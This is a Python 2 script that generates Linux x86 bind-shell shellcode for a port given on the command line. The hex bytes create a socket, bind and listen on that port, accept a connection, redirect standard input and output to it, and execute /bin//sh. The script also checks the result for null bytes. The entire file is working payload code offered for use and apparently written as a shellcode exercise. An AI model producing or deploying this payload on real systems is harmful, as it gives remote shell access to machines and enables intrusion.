import binascii
import socket
import sys

def portToHexBytes(port):
    hexBytes = []
    hexStr = ""
    portStr = hex(socket.htons(port))[2:]
    for x in (portStr[i:i+2] for i in range(0, len(portStr), 2)):
        hexBytes.append(x)
    
    for b in hexBytes[::-1]:
        hexStr += "\\x" + b
    return r"{}".format(hexStr)

def main():

    if len(sys.argv) < 2:
        print "Expected port to be included as argument"
        sys.exit(1)

    port = sys.argv[1]

    try:
        port = int(port)
    except:
        print "Invalid port!"
        sys.exit(1)

    if port < 0 or port > 65535:
        print "Port must be between 0-65535"
        sys.exit(1)

    shellcode = (r"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x52\x66\x68" + portToHexBytes(port) + r"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x52\x52\x56\x31\xc0\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x52\x52\x56\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc6\x31\xc0\x31\xc9\xb1\x03\x89\xf3\xb0\x3f\x83\xe9\x01\xcd\x80\x75\xf7\x52\x89\xe2\x89\xe1\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80")

    if r'\x00' in shellcode:
        print "Warning: Shellcode may contain null bytes\n"

    print '"%s"\n' % shellcode

if __name__ == "__main__":
    main()
